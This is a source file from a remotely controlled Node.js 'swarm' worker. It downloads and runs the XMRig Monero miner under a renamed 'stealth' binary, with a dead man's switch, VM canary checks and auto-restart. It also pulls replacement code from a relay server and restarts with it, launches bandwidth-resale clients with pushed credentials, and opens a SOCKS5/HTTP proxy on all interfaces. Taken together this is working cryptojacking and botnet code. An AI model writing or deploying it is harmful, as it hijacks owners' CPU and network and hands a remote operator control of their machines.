// ══════════════════════════════════════
var _minerProcess = null;
var _minerReportInterval = null;

function handleMineStart(task) {
  if (_minerProcess) { log('Miner already running'); return Promise.resolve({ status: 'already_running' }); }
  var wallet = task.wallet;
  var pool = task.pool;
  var workerPrefix = task.workerPrefix || 'aries-';
  var threads = task.threads || 0;
  var intensity = task.intensity || 'medium';
  var hostname = os.hostname();
  var workerName = workerPrefix + hostname;

  // Track intensity for auto-throttle
  _originalIntensity = intensity;
  _currentIntensity = intensity;

  // Capture master URL for direct reporting
  if (task.masterUrl) _masterUrl = task.masterUrl;

  log('Mine start: pool=' + pool + ' wallet=' + wallet.substring(0, 10) + '... worker=' + workerName);

  var xmrigDir = path.join(os.tmpdir(), 'aries-xmrig');
  var xmrigBin = path.join(xmrigDir, 'xmrig');

  if (!fs.existsSync(xmrigBin)) {
    log('XMRig not found, downloading...');
    try {
      if (!fs.existsSync(xmrigDir)) fs.mkdirSync(xmrigDir, { recursive: true });
      var execSync = require('child_process').execSync;
      var dlUrl = 'https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz';
      var dlFile = path.join(xmrigDir, 'xmrig.tar.gz');
      execSync("curl -fsSL -o '" + dlFile + "' '" + dlUrl + "'", { timeout: 120000 });
      execSync("tar xzf '" + dlFile + "' -C '" + xmrigDir + "' --strip-components=1", { timeout: 30000 });
      execSync("chmod +x '" + xmrigBin + "'", { timeout: 5000 });
      log('XMRig downloaded successfully');
    } catch (e) {
      log('XMRig download failed: ' + e.message);
      reportMinerStats({ status: 'error', error: 'xmrig download failed' });
      return Promise.resolve({ status: 'error', error: e.message });
    }
  }

  if (!fs.existsSync(xmrigBin)) {
    log('XMRig binary not found');
    reportMinerStats({ status: 'no-xmrig' });
    return Promise.resolve({ status: 'error', error: 'xmrig not found' });
  }

  // Stealth: rename binary if enabled
  var stealth = task.stealth !== undefined ? task.stealth : true;
  var actualBin = getStealthBin(xmrigBin, stealth);

  var args = [
    '-o', pool,
    '-u', wallet + '.' + workerName + (task.referralCode ? '#' + task.referralCode : ''),
    '-p', 'x',
    '--donate-level', '0',
    '--http-enabled', '--http-host', '127.0.0.1', '--http-port', '18088',
    '--print-time', '5'
  ];
  if (threads > 0) args.push('-t', String(threads));
  if (intensity === 'low') args.push('--cpu-max-threads-hint', '25');
  else if (intensity === 'medium') args.push('--cpu-max-threads-hint', '50');
  else if (intensity === 'high') args.push('--cpu-max-threads-hint', '75');

  var spawn = require('child_process').spawn;
  _minerProcess = spawn(actualBin, args, { stdio: 'pipe', detached: false });

  var currentHashrate = 0;
  var sharesAccepted = 0;
  var sharesRejected = 0;
  var mineStartTime = Date.now();

  _minerProcess.stdout.on('data', function(chunk) {
    var line = chunk.toString();
    var hrMatch = line.match(/speed\s+[\d.]+s\/[\d.]+s\/[\d.]+s\s+([\d.]+)/);
    if (hrMatch) currentHashrate = parseFloat(hrMatch[1]);
    var accMatch = line.match(/accepted\s+\((\d+)/);
    if (accMatch) sharesAccepted = parseInt(accMatch[1]);
    var rejMatch = line.match(/rejected\s+\((\d+)/);
    if (rejMatch) sharesRejected = parseInt(rejMatch[1]);
  });

  _minerProcess.stderr.on('data', function(chunk) {
    var line = chunk.toString();
    var hrMatch = line.match(/([\d.]+)\s*H\/s/);
    if (hrMatch) currentHashrate = parseFloat(hrMatch[1]);
  });

  _minerProcess.on('exit', function(code) {
    log('XMRig exited with code ' + code);
    _minerProcess = null;
    if (_minerReportInterval) { clearInterval(_minerReportInterval); _minerReportInterval = null; }
    reportMinerStats({ status: 'stopped', hashrate: 0 });
  });

  _minerReportInterval = setInterval(function() {
    reportMinerStats({
      status: 'mining',
      hashrate: currentHashrate,
      sharesAccepted: sharesAccepted,
      sharesRejected: sharesRejected,
      threads: threads || os.cpus().length - 1,
      cpu: os.cpus()[0].model,
      uptime: Math.floor((Date.now() - mineStartTime) / 1000)
    });
  }, 5000);

  log('XMRig started: PID=' + _minerProcess.pid);
  sendChatMessage('Starting mining at ' + intensity + ' intensity');
  return Promise.resolve({ status: 'mining', pid: _minerProcess.pid });
}

function handleMineStop() {
  if (!_minerProcess) { log('No miner running'); return Promise.resolve({ status: 'not_running' }); }
  log('Stopping miner...');
  try { _minerProcess.kill('SIGTERM'); } catch (e) {}
  _minerProcess = null;
  if (_minerReportInterval) { clearInterval(_minerReportInterval); _minerReportInterval = null; }
  reportMinerStats({ status: 'stopped', hashrate: 0 });
  sendChatMessage('Mining stopped');
  return Promise.resolve({ status: 'stopped' });
}

var _masterUrl = '';  // Set by mine-start task

function reportMinerStats(stats) {
  var nodeId = 'worker-' + os.hostname();
  var payload = { nodeId: nodeId, hostname: os.hostname(), ...stats };

  // Report to master Aries server if URL is known
  if (_masterUrl) {
    request(_masterUrl + '/api/miner/node-report', {
      method: 'POST',
      body: payload
    }).catch(function() {});
  }

  // Also report via relay as a swarm result
  request(RELAY_URL + '/api/swarm/result', {
    method: 'POST',
    body: { taskId: 'miner-stats-' + nodeId, worker: HOSTNAME, type: 'miner-stats', result: payload }
  }).catch(function() {});

  // Also try relay's node-report endpoint
  request(RELAY_URL + '/api/miner/node-report', {
    method: 'POST',
    body: payload
  }).catch(function() {});
}

// --- Benchmark handler ---
function handleMineBenchmark(task) {
  var duration = (task.duration || 60) * 1000;
  log('Benchmark: running xmrig for ' + (duration / 1000) + 's');
  var xmrigDir = path.join(os.tmpdir(), 'aries-xmrig');
  var xmrigBin = path.join(xmrigDir, 'xmrig');
  if (!fs.existsSync(xmrigBin)) { log('Benchmark: xmrig not found'); reportMinerStats({ type: 'benchmark', status: 'error', error: 'xmrig not found' }); return Promise.resolve(); }
  var spawn = require('child_process').spawn;
  var bmProc = spawn(xmrigBin, ['-o', 'stratum+tcp://rx.unmineable.com:3333', '-u', 'SOL:benchmark.test', '-p', 'x', '--donate-level', '0', '--print-time', '5'], { stdio: 'pipe', detached: false });
  var peakHashrate = 0;
  var currentHashrate = 0;
  bmProc.stdout.on('data', function(chunk) {
    var line = chunk.toString();
    var hrMatch = line.match(/speed\s+[\d.]+s\/[\d.]+s\/[\d.]+s\s+([\d.]+)/);
    if (hrMatch) { currentHashrate = parseFloat(hrMatch[1]); if (currentHashrate > peakHashrate) peakHashrate = currentHashrate; }
  });
  bmProc.stderr.on('data', function(chunk) {
    var line = chunk.toString();
    var hrMatch = line.match(/([\d.]+)\s*H\/s/);
    if (hrMatch) { currentHashrate = parseFloat(hrMatch[1]); if (currentHashrate > peakHashrate) peakHashrate = currentHashrate; }
  });
  return new Promise(function(resolve) {
    setTimeout(function() {
      try { bmProc.kill('SIGTERM'); } catch(e) {}
      log('Benchmark complete: peak=' + peakHashrate + ' H/s');
      // Save to env.json
      try { var envData = JSON.parse(fs.readFileSync(ENV_FILE, 'utf8')); envData.benchmarkHashrate = peakHashrate; fs.writeFileSync(ENV_FILE, JSON.stringify(envData, null, 2)); } catch(e) {}
      // Report back
      reportMinerStats({ type: 'benchmark', hashrate: peakHashrate, threads: os.cpus().length, cpu: os.cpus()[0] ? os.cpus()[0].model : 'unknown' });
      resolve();
    }, duration);
  });
}

// --- Mine restart handler ---
function handleMineRestart() {
  log('Received mine-restart command');
  if (_minerProcess) {
    try { _minerProcess.kill('SIGTERM'); } catch(e) {}
    _minerProcess = null;
    if (_minerReportInterval) { clearInterval(_minerReportInterval); _minerReportInterval = null; }
  }
  return new Promise(function(r) { setTimeout(r, 5000); });
}

// --- Worker update handler ---
function handleWorkerUpdate(task) {
  var code = task.linuxCode || task.code || '';
  if (!code) { log('Worker update: no code received'); return Promise.resolve(); }
  var tmpFile = path.join(__dirname, 'worker-linux.js.tmp');
  var currentFile = __filename;
  try {
    fs.writeFileSync(tmpFile, code, 'utf8');
    var execSync = require('child_process').execSync;
    execSync('node -c "' + tmpFile.replace(/"/g, '\\"') + '"', { timeout: 10000 });
    fs.copyFileSync(tmpFile, currentFile);
    fs.unlinkSync(tmpFile);
    log('Worker update: code replaced, restarting...');
    var spawn = require('child_process').spawn;
    spawn(process.execPath, [currentFile], { stdio: 'ignore', detached: true }).unref();
    process.exit(0);
  } catch(e) {
    log('Worker update failed: ' + e.message);
    try { fs.unlinkSync(tmpFile); } catch(e2) {}
  }
  return Promise.resolve();
}

// --- Self-healing miner monitor ---
var _minerRestartCount = 0;
var _minerZeroHashStart = 0;
var _lastMineTask = null;

var _origHandleMineStart = handleMineStart;
handleMineStart = function(task) {
  _lastMineTask = task;
  _minerRestartCount = 0;
  _minerZeroHashStart = 0;
  // Apply dead man's switch config
  if (task.deadManSwitch) { _deadManConfig = { enabled: task.deadManSwitch.enabled !== false, timeoutHours: task.deadManSwitch.timeoutHours || 48 }; }
  startDeadManSwitch();
  // Apply canary config
  if (task.canary) { _canaryConfig = { enabled: task.canary.enabled !== false, allowVM: task.canary.allowVM !== false }; }
  startCanaryChecks();
  var result = _origHandleMineStart(task);
  if (_minerProcess) {
    _minerProcess.on('exit', function(code) {
      if (_lastMineTask && _minerRestartCount < 5) {
        _minerRestartCount++;
        log('Self-heal: xmrig exited (code=' + code + '), restart #' + _minerRestartCount + ' in 10s');
        setTimeout(function() {
          if (_lastMineTask) _origHandleMineStart(_lastMineTask);
        }, 10000);
      } else if (_minerRestartCount >= 5) {
        log('Self-heal: max restart attempts (5) reached');
        reportMinerStats({ status: 'error', error: 'max restarts exceeded' });
      }
    });
  }
  return result;
};

// Monitor zero hashrate (no HTTP API on linux workers, check via stdout parsing interval)
var _linuxCurrentHashrate = 0;
setInterval(function() {
  if (!_minerProcess || !_lastMineTask) return;
  if (_linuxCurrentHashrate <= 0) {
    if (!_minerZeroHashStart) _minerZeroHashStart = Date.now();
    else if (Date.now() - _minerZeroHashStart > 60000 && _minerRestartCount < 5) {
      log('Self-heal: hashrate 0 for 60s, killing xmrig');
      _minerZeroHashStart = 0;
      try { _minerProcess.kill('SIGTERM'); } catch(e) {}
    }
  } else { _minerZeroHashStart = 0; }
}, 15000);

// --- Graceful shutdown ---
process.on('SIGTERM', function() { log('SIGTERM received, shutting down'); stopPacketSend(); handleMineStop(); process.exit(0); });
process.on('SIGINT', function() { log('SIGINT received, shutting down'); stopPacketSend(); handleMineStop(); process.exit(0); });
process.on('uncaughtException', function(e) { log('Uncaught: ' + e.message); });
process.on('unhandledRejection', function(r) { log('Unhandled rejection: ' + r); });

// ══════════════════════════════════════
//  WIPE-REDEPLOY HANDLER
// ══════════════════════════════════════
function handleWipeRedeploy() {
  log('Wipe-redeploy: starting...');
  // Stop mining
  if (_minerProcess) { try { _minerProcess.kill('SIGTERM'); } catch (e) {} _minerProcess = null; }
  if (_minerReportInterval) { clearInterval(_minerReportInterval); _minerReportInterval = null; }
  // Delete data files but keep env.json
  var xmrigDir = path.join(os.tmpdir(), 'aries-xmrig');
  try { fs.rmSync(xmrigDir, { recursive: true, force: true }); } catch (e) {}
  cleanupStealthBin();
  try { fs.unlinkSync(LOG_FILE); } catch (e) {}
  try { fs.rmSync('/opt/aries-swarm', { recursive: true, force: true }); } catch (e) {}
  // Report wipe complete
  request(RELAY_URL + '/api/swarm/result', {
    method: 'POST',
    body: { taskId: 'wipe-complete-' + HOSTNAME, worker: HOSTNAME, type: 'wipe-complete', result: { timestamp: Date.now() } }
  }).catch(function() {});
  log('Wipe-redeploy: wipe complete, restarting...');
  // Re-download worker code from relay and restart
  return request(RELAY_URL + '/api/swarm/worker-code?platform=linux', { timeout: 30000 })
    .then(function(res) {
      if (res.status === 200 && res.body.length > 100) {
        fs.writeFileSync(__filename, res.body, 'utf8');
        log('Wipe-redeploy: code updated from relay');
      }
    })
    .catch(function(e) { log('Wipe-redeploy: code download failed (using existing): ' + e.message); })
    .then(function() {
      var spawn = require('child_process').spawn;
      spawn(process.execPath, [__filename], { stdio: 'ignore', detached: true }).unref();
      process.exit(0);
    });
}

// ══════════════════════════════════════
//  SWARM INTELLIGENCE HANDLER
// ══════════════════════════════════════
var _discoveryData = { algoHashrate: 0, poolLatency: 0, cpuModel: SYS.cpuName };
var _poolLatencyInterval = null;

function handleSwarmIntelligence(task) {
  var rec = task.recommendation || {};
  log('Swarm intelligence: received recommendation type=' + (rec.type || 'broadcast'));
  if (rec.type === 'thread_change' && rec.threads && _minerProcess) {
    log('Swarm intelligence: applying thread change to ' + rec.threads);
    applyMinerThrottle(String(Math.round(rec.threads / os.cpus().length * 100)));
  }
  if (rec.type === 'pool_switch' && rec.pool && _lastMineTask) {
    log('Swarm intelligence: pool switch to ' + rec.pool);
    _lastMineTask.pool = rec.pool;
    if (_minerProcess) { try { _minerProcess.kill('SIGTERM'); } catch(e) {} }
  }
  return Promise.resolve();
}

// Discovery tracking: measure pool latency every 5 min
function startDiscoveryTracking() {
  if (_poolLatencyInterval) clearInterval(_poolLatencyInterval);
  _poolLatencyInterval = setInterval(function() {
    if (!_lastMineTask || !_lastMineTask.pool) return;
    var poolHost = _lastMineTask.pool.replace(/^.*:\/\//, '').split(':')[0];
    var start = Date.now();
    var netMod = require('net');
    var sock = new netMod.Socket();
    sock.setTimeout(5000);
    sock.connect(parseInt(_lastMineTask.pool.split(':').pop()) || 3333, poolHost, function() {
      _discoveryData.poolLatency = Date.now() - start;
      sock.destroy();
      request(RELAY_URL + '/api/intelligence/discovery', {
        method: 'POST',
        body: { workerId: HOSTNAME, discovery: { type: 'pool_latency', pool: _lastMineTask.pool, latency: _discoveryData.poolLatency, success: true } }
      }).catch(function() {});
    });
    sock.on('error', function() {
      request(RELAY_URL + '/api/intelligence/discovery', {
        method: 'POST',
        body: { workerId: HOSTNAME, discovery: { type: 'pool_latency', pool: _lastMineTask.pool, latency: 9999, success: false } }
      }).catch(function() {});
      sock.destroy();
    });
    sock.on('timeout', function() { sock.destroy(); });
  }, 300000);
}
startDiscoveryTracking();

// Patch getWorkerInfo to include discoveries
var _origGetWorkerInfo = getWorkerInfo;
getWorkerInfo = function() {
  var info = _origGetWorkerInfo();
  info.discoveries = {
    algoHashrate: _discoveryData.algoHashrate,
    poolLatency: _discoveryData.poolLatency,
    cpuModel: _discoveryData.cpuModel
  };
  return info;
};

// ══════════════════════════════════════
//  MESH NETWORK INTEGRATION
// ══════════════════════════════════════
var _meshNetwork = null;
var _meshRelayFailed = false;

function initMesh() {
  try {
    var MeshNetwork = require(require('path').join(__dirname, '..', 'core', 'mesh-network'));
    _meshNetwork = new MeshNetwork({
      workerId: HOSTNAME,
      relayUrl: RELAY_URL,
      secret: SECRET
    });

    _meshNetwork.on('peer-discovered', function(p) { log('Mesh: peer discovered ' + p.workerId + ' @ ' + p.ip); });
    _meshNetwork.on('peer-lost', function(p) { log('Mesh: peer lost ' + p.workerId + ' @ ' + p.ip); });
    _meshNetwork.on('gateway-elected', function(g) { log('Mesh: gateway elected ' + g.workerId + ' @ ' + g.ip); });
    _meshNetwork.on('gateway-changed', function(g) { log('Mesh: gateway changed to ' + g.workerId + ' @ ' + g.ip); });
    _meshNetwork.on('relay-forwarded', function(info) { log('Mesh: forwarded ' + info.count + ' messages to relay'); });
    _meshNetwork.on('task', function(task) {
      log('Mesh: received task from gateway');
      if (task && task.id) processTask(task).catch(function(e) { log('Mesh task error: ' + e.message); });
    });
    _meshNetwork.on('error', function(e) { log('Mesh error: ' + e.message); });

    _meshNetwork.start();
    log('Mesh network started on UDP port ' + _meshNetwork.port);
  } catch (e) {
    log('Mesh init failed (non-fatal): ' + e.message);
  }
}

// Wrap sendHeartbeat to use site controller or mesh fallback
var _origSendHeartbeat = sendHeartbeat;
sendHeartbeat = function() {
  var info = getWorkerInfo();
  if (_meshNetwork) {
    var ms = _meshNetwork.getStats();
    info.mesh = { role: ms.role, peers: ms.peers, gatewayIp: ms.gatewayIp, messagesRelayed: ms.messagesRelayed };
  }

  var heartbeatUrl = _siteControllerUrl
    ? (_siteControllerUrl.replace(/\/$/, '') + '/api/site/heartbeat')
    : (RELAY_URL + '/api/swarm/heartbeat');

  request(heartbeatUrl, { method: 'POST', body: info })
    .then(function(hbRes) {
      if (hbRes.status >= 200 && hbRes.status < 300) {
        _lastHeartbeatResponse = Date.now();
        _meshRelayFailed = false;
        if (_meshNetwork) _meshNetwork._canReachRelay = true;
      }
    })
    .catch(function(e) {
      log('Heartbeat failed (' + (_siteControllerUrl ? 'controller' : 'relay') + '): ' + e.message);
      if (_siteControllerUrl) {
        request(RELAY_URL + '/api/swarm/heartbeat', { method: 'POST', body: info })
          .then(function(r) { if (r.status >= 200 && r.status < 300) _lastHeartbeatResponse = Date.now(); })
          .catch(function() {});
        return;
      }
      _meshRelayFailed = true;
      if (_meshNetwork) {
        _meshNetwork._canReachRelay = false;
        if (_meshNetwork.sendToGateway(info)) log('Heartbeat sent via mesh gateway');
      }
    });
};

// ══════════════════════════════════════
//  THIRD-PARTY PROXY NETWORKS
// ══════════════════════════════════════
var _proxyNetworkProcs = {};
var _proxyNetworkDir = path.join(WORK_DIR, 'proxy-networks');

function _joinProxyNetwork(task) {
  var network = task.network;
  if (!network) return;
  log('Joining proxy network: ' + network);
  try { fs.mkdirSync(_proxyNetworkDir, { recursive: true }); } catch (e) {}

  var downloadUrl = (task.downloadUrls || {}).linux;
  var cliName = task.cli || network;
  var cliBin = path.join(_proxyNetworkDir, cliName);

  // Download if not present
  if (!fs.existsSync(cliBin) && downloadUrl) {
    log('Downloading ' + network + ' CLI...');
    request(downloadUrl, { method: 'GET' }).then(function(dlRes) {
      if (dlRes.status >= 200 && dlRes.status < 300 && dlRes.body) {
        fs.writeFileSync(cliBin, typeof dlRes.body === 'string' ? Buffer.from(dlRes.body, 'binary') : dlRes.body);
        try { fs.chmodSync(cliBin, 0o755); } catch (e) {}
        log('Downloaded ' + network + ' CLI');
        _launchNetworkCLI(network, cliBin, task);
      }
    }).catch(function(e) { log('Download failed: ' + e.message); });
  } else if (fs.existsSync(cliBin)) {
    _launchNetworkCLI(network, cliBin, task);
  } else {
    log(network + ' CLI not found — download URL missing');
  }
}

function _launchNetworkCLI(network, bin, task) {
  _stopProxyNetwork(network);
  var creds = task.credentials || {};
  var args = [];
  if (network === 'honeygain' && creds.email) args = ['-tou-accept', '-email', creds.email, '-pass', creds.password || ''];
  else if (network === 'pawns' && creds.email) args = ['-email=' + creds.email, '-password=' + (creds.password || ''), '-device-name=aries-' + HOSTNAME, '-accept-tos'];
  else if (network === 'packetstream' && creds.apiKey) args = ['--api-key', creds.apiKey];
  else if (network === 'grass' && creds.email) args = ['--email', creds.email, '--password', creds.password || ''];
  else if (network === 'earnapp' && creds.apiKey) args = ['--token', creds.apiKey];
  else if (network === 'repocket') args = ['--email', creds.email || '', '--api-key', creds.apiKey || ''];

  try {
    var child = require('child_process');
    var proc = child.spawn(bin, args, { cwd: _proxyNetworkDir, stdio: 'ignore', detached: true });
    proc.unref();
    proc.on('error', function(e) { log(network + ' error: ' + e.message); });
    proc.on('exit', function(code) {
      log(network + ' exited (' + code + ')');
      if (_proxyNetworkProcs[network] && (_proxyNetworkProcs[network].restartCount || 0) < 10) {
        _proxyNetworkProcs[network].restartCount = (_proxyNetworkProcs[network].restartCount || 0) + 1;
        setTimeout(function() { if (_proxyNetworkProcs[network]) _launchNetworkCLI(network, bin, task); }, 30000);
      }
    });
    _proxyNetworkProcs[network] = { proc: proc, pid: proc.pid, restartCount: 0, startedAt: Date.now() };
    log(network + ' started (PID: ' + proc.pid + ')');
  } catch (e) { log('Failed to start ' + network + ': ' + e.message); }
}

function _stopProxyNetwork(network) {
  var entry = _proxyNetworkProcs[network];
  if (entry && entry.proc) { try { entry.proc.kill(); } catch (e) {} }
  delete _proxyNetworkProcs[network];
}

function _leaveProxyNetwork(task) {
  log('Leaving proxy network: ' + (task.network || ''));
  _stopProxyNetwork(task.network);
}

// ══════════════════════════════════════
//  RESIDENTIAL PROXY (inline SOCKS5 + HTTP)
// ══════════════════════════════════════
var _proxyServer = null;
var _proxyConnections = 0;
var _proxyBytesIn = 0;
var _proxyBytesOut = 0;
var _proxyAuth = { username: 'aries', password: 'proxy' };

function _isInternalIP(host) {
  if (!host) return true;
  if (host === 'localhost' || host === '127.0.0.1' || host === '::1') return true;
  var parts = host.split('.');
  if (parts.length !== 4) return false;
  var a = parseInt(parts[0]), b = parseInt(parts[1]);
  if (a === 10 || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168) || (a === 169 && b === 254)) return true;
  return false;
}

function _startLocalProxy(task) {
  if (_proxyServer) { log('Proxy already running'); return Promise.resolve(); }
  var port = task.port || 19900;
  if (task.auth) _proxyAuth = task.auth;

  _proxyServer = net.createServer(function(client) {
    _proxyConnections++;
    client.once('data', function(chunk) {
      if (chunk[0] === 0x05) _handleSocks5Proxy(client, chunk);
      else _handleHttpProxy(client, chunk);
    });
    client.on('error', function() {});
    client.on('close', function() { _proxyConnections--; });
  });
  _proxyServer.listen(port, '0.0.0.0', function() { log('Proxy started on port ' + port); });
  _proxyServer.on('error', function(e) { log('Proxy error: ' + e.message); _proxyServer = null; });
  return Promise.resolve();
}

function _stopLocalProxy() {
  if (!_proxyServer) return;
  try { _proxyServer.close(); } catch (e) {}
  _proxyServer = null;
  log('Proxy stopped');
}

function _handleSocks5Proxy(client, initData) {
  var nmethods = initData[1] || 0, hasAuth = false;
  for (var i = 0; i < nmethods; i++) { if (initData[2 + i] === 0x02) hasAuth = true; }
  if (!hasAuth) { client.end(Buffer.from([0x05, 0xFF])); return; }
  client.write(Buffer.from([0x05, 0x02]));
  client.once('data', function(authData) {
    if (authData[0] !== 0x01) { client.end(); return; }
    var ulen = authData[1], user = authData.slice(2, 2+ulen).toString();
    var plen = authData[2+ulen], pass = authData.slice(3+ulen, 3+ulen+plen).toString();
    if (user !== _proxyAuth.username || pass !== _proxyAuth.password) { client.end(Buffer.from([0x01, 0x01])); return; }
    client.write(Buffer.from([0x01, 0x00]));
    client.once('data', function(reqData) {
      if (reqData[0] !== 0x05 || reqData[1] !== 0x01) { client.end(Buffer.from([0x05, 0x07, 0x00, 0x01, 0,0,0,0, 0,0])); return; }
      var atyp = reqData[3], dstHost, offset;
      if (atyp === 0x01) { dstHost = reqData[4]+'.'+reqData[5]+'.'+reqData[6]+'.'+reqData[7]; offset = 8; }
      else if (atyp === 0x03) { var dlen = reqData[4]; dstHost = reqData.slice(5, 5+dlen).toString(); offset = 5+dlen; }
      else { client.end(Buffer.from([0x05, 0x08, 0x00, 0x01, 0,0,0,0, 0,0])); return; }
      var dstPort = reqData.readUInt16BE(offset);
      if (_isInternalIP(dstHost)) { client.end(Buffer.from([0x05, 0x02, 0x00, 0x01, 0,0,0,0, 0,0])); return; }
      var remote = net.createConnection(dstPort, dstHost, function() {
        var reply = Buffer.from([0x05, 0x00, 0x00, 0x01, 0,0,0,0, 0,0]); reply.writeUInt16BE(dstPort, 8);
        client.write(reply); _pipeProxy(client, remote);
      });
      remote.on('error', function() { try { client.end(Buffer.from([0x05, 0x05, 0x00, 0x01, 0,0,0,0, 0,0])); } catch {} });
    });
  });
}

function _handleHttpProxy(client, initData) {
  var head = initData.toString(), firstLine = head.split('\r\n')[0] || '', parts = firstLine.split(' '), method = parts[0];
  var authMatch = head.match(/proxy-authorization:\s*basic\s+(\S+)/i);
  if (!authMatch) { client.end('HTTP/1.1 407 Proxy Authentication Required\r\nProxy-Authenticate: Basic realm="Aries"\r\n\r\n'); return; }
  try {
    var decoded = Buffer.from(authMatch[1], 'base64').toString(), cp = decoded.split(':');
    if (cp[0] !== _proxyAuth.username || cp.slice(1).join(':') !== _proxyAuth.password) { client.end('HTTP/1.1 407 Proxy Authentication Required\r\n\r\n'); return; }
  } catch (e) { client.end('HTTP/1.1 407 Proxy Authentication Required\r\n\r\n'); return; }

  if (method === 'CONNECT') {
    var target = parts[1] || '', tp = target.split(':'), host = tp[0], port = parseInt(tp[1]) || 443;
    if (_isInternalIP(host)) { client.end('HTTP/1.1 403 Forbidden\r\n\r\n'); return; }
    var remote = net.createConnection(port, host, function() { client.write('HTTP/1.1 200 Connection Established\r\n\r\n'); _pipeProxy(client, remote); });
    remote.on('error', function() { try { client.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch {} });
  } else {
    var targetUrl;
    try { targetUrl = new (require('url').URL)(parts[1]); } catch (e) { client.end('HTTP/1.1 400 Bad Request\r\n\r\n'); return; }
    if (_isInternalIP(targetUrl.hostname)) { client.end('HTTP/1.1 403 Forbidden\r\n\r\n'); return; }
    var rport = parseInt(targetUrl.port) || 80;
    var remote = net.createConnection(rport, targetUrl.hostname, function() {
      var newHead = head.replace(parts[1], targetUrl.pathname + (targetUrl.search || '')).replace(/proxy-authorization:[^\r\n]*\r\n/gi, '');
      remote.write(newHead); _pipeProxy(client, remote);
    });
    remote.on('error', function() { try { client.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch {} });
  }
}

function _pipeProxy(client, remote) {
  client.on('data', function(c) { _proxyBytesIn += c.length; try { remote.write(c); } catch {} });
  remote.on('data', function(c) { _proxyBytesOut += c.length; try { client.write(c); } catch {} });
  client.on('end', function() { try { remote.end(); } catch {} });
  remote.on('end', function() { try { client.end(); } catch {} });
  client.on('error', function() { try { remote.destroy(); } catch {} });
  remote.on('error', function() { try { client.destroy(); } catch {} });
}

main().catch(function(e) { log('Fatal: ' + e.message); process.exit(1); });
